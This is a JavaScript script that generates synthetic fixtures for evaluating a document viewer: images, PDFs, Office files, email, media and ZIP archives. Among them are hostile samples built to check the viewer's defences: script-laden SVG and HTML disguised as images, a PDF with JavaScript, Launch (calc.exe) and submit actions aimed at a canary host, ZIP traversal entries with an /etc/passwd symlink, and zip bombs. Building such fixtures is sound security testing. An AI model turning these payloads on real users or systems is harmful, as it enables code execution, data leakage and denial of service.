// Generate every synthetic viewer fixture into .local/viewer-evaluation/fixtures/ (ignored) and write manifest.json
// with each file's family, SHA-256, size and generator. Nothing here reads case material; external URLs point at
// canary.invalid. Needs ImageMagick 7, FFmpeg, LibreOffice and qpdf on PATH (recorded in the manifest).
// Usage: bun fixtures/generate.mjs [--skip-large]
import { createHash } from 'node:crypto';
import { mkdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import path from 'node:path';
import { Pdf, buildPdf, tokenPages } from './lib/pdf.mjs';
import { buildZip, zeroBomb } from './lib/zip.mjs';
import { fullDocx, altChunkDocx } from './lib/ooxml.mjs';
import { mainWorkbook, chartWorkbook, largeWorkbook, CSV } from './lib/sheets.mjs';
import { gmailEml, outlookEml, hostileEml, takeoutMbox, carrierEml } from './lib/mail.mjs';
import { unknownBlobs } from './lib/unknown.mjs';
import { buildMsg, melaRtf } from './lib/msg.mjs';
import { ffmpeg, magick, run, soffice, version } from './lib/tools.mjs';
import { OUT_ROOT } from '../harness/paths.mjs';

const OUT = path.join(OUT_ROOT, 'fixtures');
const TMP = path.join(OUT_ROOT, 'tmp');
const skipLarge = process.argv.includes('--skip-large');
rmSync(OUT, { recursive: true, force: true });
rmSync(TMP, { recursive: true, force: true });
mkdirSync(TMP, { recursive: true });
const manifest = { generatedBy: 'tests/viewer-evaluation/fixtures/generate.mjs', tools: {}, fixtures: [] };
for (const [k, cmd, args] of [['imagemagick', 'magick', ['-version']], ['ffmpeg', 'ffmpeg', ['-version']], ['libreoffice', 'soffice', ['--version']], ['qpdf', 'qpdf', ['--version']]]) manifest.tools[k] = version(cmd, args);

const sha = (b) => createHash('sha256').update(b).digest('hex');
function put(family, name, bytes, generator, extra = {}) {
  const file = path.join(OUT, family, name);
  mkdirSync(path.dirname(file), { recursive: true });
  const b = typeof bytes === 'string' ? Buffer.from(bytes, 'utf8') : Buffer.from(bytes);
  writeFileSync(file, b);
  manifest.fixtures.push({ id: `${family}/${name}`, family, file: path.relative(OUT, file), bytes: b.length, sha256: sha(b), generator, ...extra });
  return file;
}
const tmp = (name) => path.join(TMP, name);
/** Valid but unusual structure (REVIEW.md): inherited page attributes, indirect /Resources, a /Contents array. */
function inheritedPdf() {
  const pdf = new Pdf();
  const catalog = pdf.reserve(), root = pdf.reserve(), mid = pdf.reserve();
  const helv = pdf.add('<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica /Encoding /WinAnsiEncoding >>');
  const res = pdf.add(`<< /Font << /F1 ${helv} 0 R >> >>`);
  const text = (y, t) => `BT /F1 18 Tf 40 ${y} Td (${t}) Tj ET\n`;
  const c1a = pdf.add(pdf.stream('', text(500, 'PDF-INHERIT-P1-A')));
  const c1b = pdf.add(pdf.stream('', text(460, 'PDF-INHERIT-P1-B')));
  const p1 = pdf.add(`<< /Type /Page /Parent ${root} 0 R /Contents [${c1a} 0 R ${c1b} 0 R] >>`);
  const p2 = pdf.add(`<< /Type /Page /Parent ${mid} 0 R /Contents ${pdf.add(pdf.stream('', text(500, 'PDF-INHERIT-P2')))} 0 R >>`);
  const p3 = pdf.add(`<< /Type /Page /Parent ${mid} 0 R /MediaBox [0 0 300 300] /Rotate 0 /Contents ${pdf.add(pdf.stream('', text(150, 'PDF-INHERIT-P3')))} 0 R >>`);
  pdf.set(root, `<< /Type /Pages /Kids [${p1} 0 R ${mid} 0 R] /Count 3 /MediaBox [0 0 842 595] /Rotate 90 /Resources ${res} 0 R >>`);
  pdf.set(mid, `<< /Type /Pages /Parent ${root} 0 R /Kids [${p2} 0 R ${p3} 0 R] /Count 2 >>`);
  pdf.set(catalog, `<< /Type /Catalog /Pages ${root} 0 R >>`);
  return pdf.bytes(catalog);
}
/** A trailer whose /Encrypt dictionary is written inline straight after the name. The xref offset is unaffected. */
function inlineEncryptPdf() {
  const plain = new TextDecoder('latin1').decode(buildPdf(tokenPages(1, 'PDF-INLINE-ENCRYPT')));
  const hex = (b) => Buffer.alloc(32, b).toString('hex');
  const out = plain.replace(/\/Root (\d+) 0 R/, (m) => `${m} /Encrypt<</Filter/Standard/V 2/R 3/Length 128/O<${hex(0x4f)}>/U<${hex(0x55)}>/P -3904>>/ID[<${'ab'.repeat(16)}><${'ab'.repeat(16)}>]`);
  return Buffer.from(out, 'latin1');
}
/** Insert an EXIF APP1 segment (big-endian TIFF, one IFD entry: Orientation) after the JPEG's APP0. */
function withExifOrientation(jpeg, orientation) {
  const tiff = Buffer.from([0x4d, 0x4d, 0x00, 0x2a, 0, 0, 0, 8, 0, 1, 0x01, 0x12, 0, 3, 0, 0, 0, 1, 0, orientation, 0, 0, 0, 0, 0, 0]);
  const body = Buffer.concat([Buffer.from('Exif\0\0', 'latin1'), tiff]);
  const app1 = Buffer.concat([Buffer.from([0xff, 0xe1, (body.length + 2) >> 8, (body.length + 2) & 0xff]), body]);
  const app0End = jpeg[2] === 0xff && jpeg[3] === 0xe0 ? 4 + jpeg.readUInt16BE(4) : 2;
  return Buffer.concat([jpeg.subarray(0, app0End), app1, jpeg.subarray(app0End)]);
}
const read = (f) => readFileSync(f);
const profile = path.join(TMP, 'lo-profile');

// ---------- images (generated first: other families embed them) ----------
magick('-size', '400x200', 'xc:white', '-fill', '#ff0000', '-draw', 'rectangle 0,0 199,199', '-fill', '#0000ff', '-draw', 'rectangle 200,0 399,199', tmp('pattern.png'));
const pattern = read(tmp('pattern.png'));
put('image', 'png-pattern.png', pattern, 'magick: 400x200, left red, right blue');
magick(tmp('pattern.png'), '-quality', '92', tmp('plain.jpg'));
put('image', 'jpeg-exif-orientation-6.jpg', withExifOrientation(read(tmp('plain.jpg')), 6), 'magick JPEG + hand-written EXIF APP1 with Orientation=6 (pixels not rotated)');
magick('-size', '100x100', 'xc:none', '-fill', 'rgba(0,128,0,1)', '-draw', 'rectangle 0,0 49,99', 'PNG32:' + tmp('alpha.png'));
put('image', 'png-alpha.png', read(tmp('alpha.png')), 'magick: left half opaque green, right half transparent');
magick('-delay', '20', '-size', '60x60', 'xc:#ff0000', 'xc:#00ff00', 'xc:#0000ff', '-loop', '0', tmp('anim.gif'));
put('image', 'gif-animated-3.gif', read(tmp('anim.gif')), 'magick: 3 frames red/green/blue');
magick(tmp('pattern.png'), tmp('pattern.webp'));
put('image', 'webp-pattern.webp', read(tmp('pattern.webp')), 'magick');
magick(tmp('pattern.png'), tmp('pattern.avif'));
put('image', 'avif-pattern.avif', read(tmp('pattern.avif')), 'magick');
magick(tmp('pattern.png'), tmp('pattern.heic'));
put('image', 'heic-pattern.heic', read(tmp('pattern.heic')), 'magick (libheif)');
const tiffPages = [1, 2, 3].map((n) => { const f = tmp(`tp${n}.png`); magick('-size', '600x300', 'xc:white', '-fill', 'black', '-draw', `rectangle ${n * 100},40 ${n * 100 + 80},260`, f); return f; });
magick(...tiffPages, '-compress', 'Group4', tmp('g4.tif'));
put('image', 'tiff-multipage-g4.tif', read(tmp('g4.tif')), 'magick: 3 bilevel pages, CCITT Group 4; page n has a bar at x=n*100');
magick(tmp('pattern.png'), '-compress', 'LZW', tmp('lzw.tif'));
put('image', 'tiff-lzw.tif', read(tmp('lzw.tif')), 'magick: LZW RGB');
magick(tmp('pattern.png'), '-compress', 'JPEG', tmp('jpeg.tif'));
put('image', 'tiff-jpeg.tif', read(tmp('jpeg.tif')), 'magick: JPEG-in-TIFF');
magick(tmp('pattern.png'), 'TIFF64:' + tmp('big.tif'));
put('image', 'bigtiff.tif', read(tmp('big.tif')), 'magick: BigTIFF container');
for (const [n, f] of tiffPages.entries()) put('image', `tiff-multipage-g4.rendition-p${n + 1}.png`, read(f), 'prepared rendition: one lossless PNG per TIFF page', { renditionOf: 'image/tiff-multipage-g4.tif', page: n + 1 });
magick(tmp('pattern.heic'), tmp('heic.rendition.png'));
put('image', 'heic-pattern.rendition.png', read(tmp('heic.rendition.png')), 'prepared rendition: magick HEIC -> PNG', { renditionOf: 'image/heic-pattern.heic', page: 1 });
put('image', 'svg-masquerade.png', '<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><script>fetch("http://canary.invalid/svg-img")</script><rect width="10" height="10"/></svg>', 'hand-written: SVG with script, named .png');
put('image', 'html-masquerade.jpg', '<html><body><script>fetch("http://canary.invalid/html-img")</script>HTML</body></html>', 'hand-written: HTML named .jpg');
if (!skipLarge) {
  magick('-size', '5000x4000', 'gradient:#ff0000-#0000ff', tmp('20mp.png'));
  put('image', 'large-20mp.png', read(tmp('20mp.png')), 'magick: 5000x4000 gradient (20 MP tier)', { stress: '20 MP' });
  magick('-size', '10000x10000', 'gradient:#00ff00-#000000', tmp('100mp.png'));
  put('image', 'large-100mp.png', read(tmp('100mp.png')), 'magick: 10000x10000 gradient (100 MP tier)', { stress: '100 MP' });
}

// ---------- PDF ----------
const textBasic = buildPdf(tokenPages(3, 'PDF-TEXT'), { title: 'Text basic' });
put('pdf', 'text-basic.pdf', textBasic, 'lib/pdf.mjs: 3 Helvetica text pages, token PDF-TEXT-000n');
put('pdf', 'mixed-pages-labels.pdf', buildPdf([
  ...tokenPages(2, 'PDF-ROMAN'),
  { size: [595, 842], lines: [[72, 740, 18, 'PDF-A4-PAGE']] },
  { size: [792, 612], lines: [[72, 540, 18, 'PDF-LANDSCAPE-PAGE']] },
  { size: [612, 792], rotate: 90, lines: [[72, 700, 18, 'PDF-ROTATED-PAGE']] },
  { size: [612, 792], lines: [[72, 700, 18, 'PDF-DUPLICATE-LABEL-PAGE']] },
], { labels: '<< /Nums [0 << /S /r >> 2 << /S /D >> 5 << /S /D /St 3 >>] >>', title: 'Mixed sizes and labels' }), 'lib/pdf.mjs: 6 pages, labels i ii 1 2 3 3 (duplicate), A4, landscape, /Rotate 90');
const scan = new Uint8Array(200 * 100 * 3).map((_, i) => ((i / 3) % 200 < 100 ? 200 : 40));
put('pdf', 'scanned-no-text.pdf', buildPdf([{ size: [612, 792], image: { w: 200, h: 100, rgb: scan } }], { title: 'Scanned page' }), 'lib/pdf.mjs: one image-only page, no text layer');
put('pdf', 'scanned-no-text.ocr.txt', 'OCR companion for scanned-no-text.pdf page 1: PDF-OCR-COMPANION-TOKEN', 'prepared companion: OCR text', { renditionOf: 'pdf/scanned-no-text.pdf', page: 1 });
put('pdf', 'hostile-actions.pdf', buildPdf([
  {
    lines: [[72, 700, 18, 'PDF-HOSTILE-TOKEN']],
    aa: '<< /O << /S /JavaScript /JS (fetch\\("http://canary.invalid/pdf-page-open"\\)) >> >>',
    annots: [
      '<< /Type /Annot /Subtype /Link /Rect [72 600 300 620] /Border [0 0 0] /A << /S /URI /URI (http://canary.invalid/pdf-uri) >> >>',
      '<< /Type /Annot /Subtype /Link /Rect [72 560 300 580] /Border [0 0 0] /A << /S /Launch /F (calc.exe) >> >>',
      '<< /Type /Annot /Subtype /Link /Rect [72 520 300 540] /Border [0 0 0] /A << /S /JavaScript /JS (app.launchURL\\("http://canary.invalid/pdf-js-link"\\)) >> >>',
      (page) => `<< /Type /Annot /Subtype /Widget /FT /Tx /T (field1) /V (PDF-FIELD-VALUE) /Rect [72 460 300 480] /P ${page} 0 R /F 4 /DA (/Helv 12 Tf 0 g) /AA << /K << /S /JavaScript /JS (fetch\\("http://canary.invalid/pdf-keystroke"\\)) >> >> >>`,
      '<< /Type /Annot /Subtype /Widget /FT /Btn /Ff 65536 /T (submit) /Rect [72 400 200 430] /F 4 /A << /S /SubmitForm /F << /FS /URL /F (http://canary.invalid/pdf-submit) >> >> >>',
    ],
  },
], {
  openAction: '<< /S /JavaScript /JS (app.alert\\("pdf-open"\\); this.submitForm\\("http://canary.invalid/pdf-open-submit"\\);) >>',
  acroForm: () => '<< /Fields [] /NeedAppearances true >>',
  title: 'Hostile actions',
}), 'lib/pdf.mjs: OpenAction JS, page-open JS, URI/Launch/JS links, keystroke JS field, SubmitForm button');
put('pdf', 'truncated.pdf', textBasic.subarray(0, Math.floor(textBasic.length * 0.6)), 'text-basic.pdf cut at 60%: no xref, trailer or %%EOF');
writeFileSync(tmp('basic.pdf'), textBasic);
run('qpdf', ['--encrypt', 'synthetic-user', 'synthetic-owner', '256', '--', tmp('basic.pdf'), tmp('enc.pdf')]);
put('pdf', 'encrypted-user-password.pdf', read(tmp('enc.pdf')), 'qpdf: AES-256 with a user password');
put('pdf', 'inherited-attributes.pdf', inheritedPdf(), 'two-level page tree: /MediaBox, /Rotate 90 and an indirect /Resources inherited from the root /Pages; page 1 /Contents is an array of two streams; page 3 overrides with 300x300 /Rotate 0');
put('pdf', 'encrypted-inline-dict.pdf', inlineEncryptPdf(), 'trailer carries /Encrypt<<...>> inline with no whitespace after the name (RC4-128, no usable password)');
put('pdf', 'cjk-nonembedded.pdf', buildPdf([{ lines: [[72, 720, 18, 'PDF-CJK-PAGE']], cjk: [[72, 680, 24, '中文测试']] }], { title: 'CJK' }), 'lib/pdf.mjs: non-embedded STSong-Light, UniGB-UCS2-H CMap');
if (!skipLarge) put('pdf', 'large-1000-pages.pdf', buildPdf(tokenPages(1000, 'PDF-LARGE')), 'lib/pdf.mjs: 1,000 text pages (stress tier)', { stress: '1,000 pages' });

// ---------- Word ----------
const docx = fullDocx(pattern);
const docxFile = put('word', 'full-content.docx', docx, 'lib/ooxml.mjs: heading, footnote, comment, tracked ins/del, table, embedded + external image, external link, manual break, landscape section, header/footer, PAGE field');
put('word', 'altchunk.docx', altChunkDocx(), 'lib/ooxml.mjs: altChunk HTML with script, remote image, form');
const docPdf = soffice(docxFile, 'pdf:writer_pdf_Export:{"UseTaggedPDF":{"type":"boolean","value":"true"},"ExportNotesInMargin":{"type":"boolean","value":"true"}}', path.join(TMP, 'lo-docx'), profile);
put('word', 'full-content.rendition-v1.pdf', docPdf, `prepared rendition: LibreOffice headless, tagged PDF, comments in margin, offline (${manifest.tools.libreoffice})`, { renditionOf: 'word/full-content.docx', version: 1 });
const docPdfDefault = soffice(docxFile, 'pdf', path.join(TMP, 'lo-docx-default'), profile);
put('word', 'full-content.default-export.pdf', docPdfDefault, 'LibreOffice headless default PDF export (no options), offline: evidence for the recipe options');
const doc = soffice(docxFile, 'doc:MS Word 97', path.join(TMP, 'lo-doc'), profile);
const docFile = put('word', 'legacy.doc', doc, 'LibreOffice: full-content.docx saved as Word 97 .doc');
put('word', 'legacy.rendition-v1.pdf', soffice(docFile, 'pdf', path.join(TMP, 'lo-doc-pdf'), profile), 'prepared rendition: LibreOffice headless, offline', { renditionOf: 'word/legacy.doc', version: 1 });

// ---------- Excel ----------
const xlsxFile = put('sheet', 'main.xlsx', mainWorkbook('xlsx'), 'lib/sheets.mjs via SheetJS CE 0.20.3: hidden/very hidden sheets, hidden row 6 and column D, merge, comment, formats, error, formula with and without cached result');
put('sheet', 'main-1904.xlsx', mainWorkbook('xlsx', true), 'as main.xlsx with the 1904 date system');
put('sheet', 'main.xls', soffice(xlsxFile, 'xls:MS Excel 97', path.join(TMP, 'lo-xls'), profile), 'LibreOffice: main.xlsx saved as Excel 97 .xls (SheetJS CE cannot write BIFF formulas or row flags)');
const chartFile = put('sheet', 'chart.xlsx', chartWorkbook(), 'lib/sheets.mjs: bar chart over Summary!B2:B4 (drawing + chart parts)');
put('sheet', 'chart.supplement-v1.pdf', soffice(chartFile, 'pdf', path.join(TMP, 'lo-chart'), profile), 'prepared supplement: LibreOffice PDF of the chart sheet, offline', { renditionOf: 'sheet/chart.xlsx', version: 1 });
put('sheet', 'main.supplement-v1.pdf', soffice(xlsxFile, 'pdf', path.join(TMP, 'lo-main'), profile), 'prepared supplement: LibreOffice PDF of main.xlsx, offline (checks recalculation and print omissions)', { renditionOf: 'sheet/main.xlsx', version: 1 });
put('sheet', 'data.csv', CSV, 'hand-written: BOM, non-ASCII, quoted delimiters/newlines, leading zeros, formula-like strings, empty vs missing');
if (!skipLarge) {
  put('sheet', 'large-100k-cells.xlsx', largeWorkbook(10000, 10), 'SheetJS: 10,000 x 10 populated cells (100k tier)', { stress: '100k cells' });
  put('sheet', 'large-1m-cells.xlsx', largeWorkbook(100000, 10), 'SheetJS: 100,000 x 10 populated cells (1m tier)', { stress: '1m cells' });
}

// ---------- Email ----------
const innerMsg = { subject: 'MSG-NESTED-SUBJECT-TOKEN', from: ['Inner Sender', 'inner@example.invalid'], to: [['Synthetic Recipient', 'recipient@example.invalid']], body: 'MSG-NESTED-BODY-TOKEN', attachments: [{ name: 'deep.txt', mime: 'text/plain', data: Buffer.from('MSG-DEEP-ATTACHMENT-TOKEN') }] };
const outlookMsg = buildMsg({
  subject: 'Outlook MSG – Zoë MSG-SUBJECT-TOKEN', from: ['Synthetic Sender', 'sender@example.invalid'], to: [['Synthetic Recipient', 'recipient@example.invalid'], ['Second Recipient', 'cc@example.invalid']],
  body: 'MSG-PLAIN-BODY-TOKEN', html: '<html><body><p>MSG-HTML-BODY-TOKEN</p><img src="cid:img001@synthetic" alt="inline"><img src="http://canary.invalid/msg-pixel.gif"></body></html>',
  headers: 'Received: from SYNTH01.example.invalid by SYNTH02.example.invalid; Tue, 2 Jan 2001 10:00:00 +0000\r\nMessage-ID: <SYNTHMSG0001@SYNTH01.example.invalid>\r\nSubject: Outlook MSG\r\nDate: Tue, 2 Jan 2001 10:00:00 +0000\r\n',
  attachments: [{ name: 'chart.png', mime: 'image/png', cid: 'img001@synthetic', data: pattern }, { name: 'statement.pdf', mime: 'application/pdf', data: textBasic }, { name: 'Forwarded item', message: innerMsg }],
});
put('email', 'outlook-save-as.msg', outlookMsg, 'lib/msg.mjs: Outlook-shaped MSG (structure model): HTML+plain, CID image, PDF, embedded MSG with its own attachment');
put('email', 'outlook-rtf-only.msg', buildMsg({ subject: 'MSG-RTF-ONLY-SUBJECT', from: ['Synthetic Sender', 'sender@example.invalid'], rtf: melaRtf('{\\rtf1\\ansi MSG-RTF-ONLY-TOKEN}') }), 'lib/msg.mjs: body only as compressed RTF (MELA)');
put('email', 'gmail-download.eml', gmailEml({ pdf: textBasic, png: pattern }), 'lib/mail.mjs: Gmail "Download message"-shaped EML (structure model): UTF-8 encoded-word subject, alternative + related CID image, PDF, duplicate filenames');
put('email', 'outlook-download.eml', outlookEml({ msg: outlookMsg, nestedPng: pattern }), 'lib/mail.mjs: Outlook "Download"-shaped EML (structure model): Latin-1 QP, folded subject, duplicate header, nested message/rfc822, nested .msg');
put('email', 'hostile.eml', hostileEml(), 'lib/mail.mjs: scripts, handlers, remote CSS/images/iframe, meta refresh, form, javascript: link, malformed base64, TNEF');
put('email', 'gmail-takeout.mbox', takeoutMbox(), 'lib/mail.mjs: Google Takeout-shaped mbox, 2 messages (bulk container)');

// ---------- Media ----------
const colors = ['-f', 'lavfi', '-i', 'color=c=#ff0000:s=320x240:r=25:d=2', '-f', 'lavfi', '-i', 'color=c=#00ff00:s=320x240:r=25:d=2', '-f', 'lavfi', '-i', 'color=c=#0000ff:s=320x240:r=25:d=2', '-f', 'lavfi', '-i', 'sine=frequency=440:duration=6'];
const concat = ['-filter_complex', '[0][1][2]concat=n=3:v=1:a=0[v]', '-map', '[v]', '-map', '3:a'];
const media = [
  ['mp4-h264-aac-faststart.mp4', [...colors, ...concat, '-c:v', 'libx264', '-g', '150', '-pix_fmt', 'yuv420p', '-c:a', 'aac', '-movflags', '+faststart'], 'H.264 long GOP (1 keyframe/6 s) + AAC, faststart; red 0-2 s, green 2-4 s, blue 4-6 s'],
  ['mp4-h264-aac-moov-end.mp4', [...colors, ...concat, '-c:v', 'libx264', '-pix_fmt', 'yuv420p', '-c:a', 'aac'], 'H.264 + AAC, moov at end (no faststart)'],
  ['webm-vp9-opus.webm', [...colors, ...concat, '-c:v', 'libvpx-vp9', '-b:v', '200k', '-c:a', 'libopus'], 'VP9 + Opus'],
  ['mov-h264-aac.mov', [...colors, ...concat, '-c:v', 'libx264', '-pix_fmt', 'yuv420p', '-c:a', 'aac'], 'QuickTime H.264 + AAC'],
  ['mkv-h264-aac.mkv', [...colors, ...concat, '-c:v', 'libx264', '-pix_fmt', 'yuv420p', '-c:a', 'aac'], 'Matroska H.264 + AAC'],
  ['avi-mpeg4-mp3.avi', [...colors, ...concat, '-c:v', 'mpeg4', '-c:a', 'libmp3lame'], 'AVI MPEG-4 Part 2 + MP3'],
  ['mp4-two-audio-tracks.mp4', [...colors, '-f', 'lavfi', '-i', 'sine=frequency=880:duration=6', '-filter_complex', '[0][1][2]concat=n=3:v=1:a=0[v]', '-map', '[v]', '-map', '3:a', '-map', '4:a', '-c:v', 'libx264', '-pix_fmt', 'yuv420p', '-c:a', 'aac', '-movflags', '+faststart'], 'H.264 + two AAC tracks (440 Hz, 880 Hz)'],
  ['mp3-sine.mp3', ['-f', 'lavfi', '-i', 'sine=frequency=440:duration=6', '-c:a', 'libmp3lame'], 'MP3 6 s'],
  ['wav-pcm.wav', ['-f', 'lavfi', '-i', 'sine=frequency=440:duration=6', '-c:a', 'pcm_s16le'], 'WAV PCM 6 s'],
  ['ogg-opus.ogg', ['-f', 'lavfi', '-i', 'sine=frequency=440:duration=6', '-c:a', 'libopus'], 'Ogg Opus 6 s'],
  ['m4a-aac.m4a', ['-f', 'lavfi', '-i', 'sine=frequency=440:duration=6', '-c:a', 'aac'], 'M4A AAC 6 s'],
  ['mp3-one-hour.mp3', ['-f', 'lavfi', '-i', 'sine=frequency=500:duration=3600', '-ac', '1', '-ar', '8000', '-c:a', 'libmp3lame', '-b:a', '8k'], 'MP3 3,600 s, 8 kbit/s (long duration)'],
];
for (const [name, args, note] of media) { ffmpeg(...args, tmp(name)); put('media', name, read(tmp(name)), `ffmpeg: ${note}`); }
const mp4 = read(tmp('mp4-h264-aac-faststart.mp4'));
put('media', 'mp4-truncated.mp4', mp4.subarray(0, Math.floor(mp4.length / 2)), 'mp4-h264-aac-faststart.mp4 cut at 50%');
ffmpeg('-i', tmp('avi-mpeg4-mp3.avi'), '-c:v', 'libx264', '-pix_fmt', 'yuv420p', '-c:a', 'aac', '-movflags', '+faststart', tmp('avi.rendition.mp4'));
put('media', 'avi-mpeg4-mp3.rendition-v1.mp4', read(tmp('avi.rendition.mp4')), 'prepared rendition: ffmpeg remux/transcode to H.264/AAC faststart, offline', { renditionOf: 'media/avi-mpeg4-mp3.avi', version: 1 });
put('media', 'mp4-h264-aac-faststart.captions.vtt', 'WEBVTT\n\n00:00.000 --> 00:02.000\nMEDIA-CAPTION-RED\n\n00:02.000 --> 00:04.000\nMEDIA-CAPTION-GREEN\n\n00:04.000 --> 00:06.000\nMEDIA-CAPTION-BLUE\n', 'hand-written WebVTT companion', { renditionOf: 'media/mp4-h264-aac-faststart.mp4' });

// ---------- ZIP ----------
const eml = Buffer.from(gmailEml({ pdf: textBasic, png: pattern }));
put('archive', 'basic.zip', buildZip([
  { name: 'docs/', data: '', method: 0 },
  { name: 'docs/readme.txt', data: 'ZIP-STORED-TOKEN', method: 0 },
  { name: 'docs/deflated.txt', data: 'ZIP-DEFLATED-TOKEN '.repeat(50), method: 8 },
  { name: 'docs/empty.txt', data: '', method: 0 },
  { name: 'Ünïcode – 名前.txt', data: 'ZIP-UNICODE-TOKEN', method: 8 },
  { name: 'statement.pdf', data: textBasic, method: 8 },
  { name: 'message.eml', data: eml, method: 8 },
  { name: 'workbook.xlsx', data: mainWorkbook('xlsx'), method: 0 },
  { name: 'nested.zip', data: buildZip([{ name: 'inner.txt', data: 'ZIP-NESTED-INNER-TOKEN' }]), method: 0 },
]), 'lib/zip.mjs: stored/deflated, directory, empty, Unicode name, nested PDF/EML/XLSX/ZIP');
put('archive', 'duplicates.zip', buildZip([{ name: 'report.txt', data: 'ZIP-DUP-FIRST' }, { name: 'report.txt', data: 'ZIP-DUP-SECOND' }]), 'lib/zip.mjs: two entries named report.txt');
put('archive', 'traversal.zip', buildZip([
  { name: '../../evil.txt', data: 'ZIP-TRAVERSAL' }, { name: '/abs/evil.txt', data: 'ZIP-ABSOLUTE' }, { name: 'C:\\evil.txt', data: 'ZIP-DRIVE' },
  { name: 'link-to-etc', data: '/etc/passwd', method: 0, unixMode: 0o120777 }, { name: 'safe.txt', data: 'ZIP-SAFE-TOKEN' },
]), 'lib/zip.mjs: parent traversal, absolute, drive-letter, symlink, one safe entry');
put('archive', 'corrupt-crc.zip', buildZip([{ name: 'bad.txt', data: 'ZIP-CRC-TOKEN', crc: 0xdeadbeef }]), 'lib/zip.mjs: stored CRC does not match the data');
put('archive', 'encrypted-flag.zip', buildZip([{ name: 'secret.txt', data: 'ciphertext-placeholder', method: 0, flags: 1 }]), 'lib/zip.mjs: general-purpose bit 0 (encrypted)');
put('archive', 'unsupported-method.zip', buildZip([{ name: 'lzma.txt', data: 'not really lzma', method: 14 }]), 'lib/zip.mjs: compression method 14 (LZMA)');
put('archive', 'bomb-256mib.zip', buildZip([{ name: 'zeros.bin', raw: zeroBomb(256 << 20), method: 8, crc: 0, size: 256 << 20 }]), 'lib/zip.mjs: one entry deflating to 256 MiB of zeros (bounded bomb; CRC deliberately 0)');
put('archive', 'bomb-lying-size.zip', buildZip([{ name: 'zeros.bin', raw: zeroBomb(256 << 20), method: 8, crc: 0, size: 1000 }]), 'lib/zip.mjs: the same 256 MiB expansion with a declared size of 1,000 bytes');
put('archive', 'many-1000.zip', buildZip(Array.from({ length: 1000 }, (_, i) => ({ name: `entries/item-${String(i + 1).padStart(4, '0')}.txt`, data: `ZIP-MANY-${i + 1}` }))), 'lib/zip.mjs: 1,000 entries (stress tier)', { stress: '1,000 members' });

// ---------- Unrecognised and unsupported bytes (H1): top level, inside a ZIP, attached to an EML ----------
const blobs = unknownBlobs();
for (const [name, bytes] of Object.entries(blobs)) put('unknown', name, bytes, 'lib/unknown.mjs: signature bytes only (PST/OST header, 7z, RAR, gzip) or unsignatured filler');
put('archive', 'unknown-members.zip', buildZip(Object.entries(blobs).map(([name, data]) => ({ name, data, method: 8 }))), 'lib/zip.mjs: the six unknown/unsupported blobs as members');
put('email', 'unknown-attachments.eml', carrierEml({ subject: 'UNKNOWN-ATTACHMENTS-SUBJECT-TOKEN', attachments: Object.entries(blobs).map(([name, data]) => ({ name, mime: 'application/octet-stream', data })) }), 'lib/mail.mjs: the six unknown/unsupported blobs as attachments');

writeFileSync(path.join(OUT, 'manifest.json'), JSON.stringify(manifest, null, 1));
rmSync(TMP, { recursive: true, force: true });
console.log(`fixtures: ${manifest.fixtures.length} files in ${path.relative(process.cwd(), OUT) || OUT}`);
